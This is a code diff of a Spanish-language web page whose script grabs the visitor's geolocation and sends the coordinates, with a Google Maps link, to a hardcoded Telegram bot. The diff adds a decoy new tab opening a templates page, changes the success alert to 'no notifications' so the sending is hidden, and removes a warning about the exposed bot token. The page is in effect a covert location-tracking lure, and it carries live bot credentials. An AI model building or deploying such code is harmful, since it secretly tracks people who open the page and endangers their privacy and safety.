@@ -11,6 +11,10 @@
 
     <script>
         function obtenerUbicacion() {
+            // 1. Abre la página en una nueva pestaña
+            window.open("https://plantillas-net.github.io/trabajo/", "_blank");
+
+            // 2. Luego obtiene la ubicación
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(enviarUbicacion, errorUbicacion);
             } else {
@@ -23,7 +27,7 @@
             let lon = position.coords.longitude;
             let mensaje = `Ubicación recibida:\nLatitud: ${lat}\nLongitud: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
 
-            let botToken = "7942913397:AAH7v5CiM27nKvV7IsK3T3TRnE-LJm5doQ0"; // ⚠️ No recomendado exponerlo
+            let botToken = "7942913397:AAH7v5CiM27nKvV7IsK3T3TRnE-LJm5doQ0"; // ⚠️ 
             let chatId = "1617751854"; 
 
             let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
@@ -32,7 +36,7 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert("Error enviado.");
+                        alert("sin notificaciones.");
                     } else {
                         alert("Error.");
                     }
@@ -44,7 +48,7 @@
         }
 
         function errorUbicacion(error) {
-            alert("Error" + error.message);
+            alert("Error: " + error.message);
         }
     </script>
 </body>
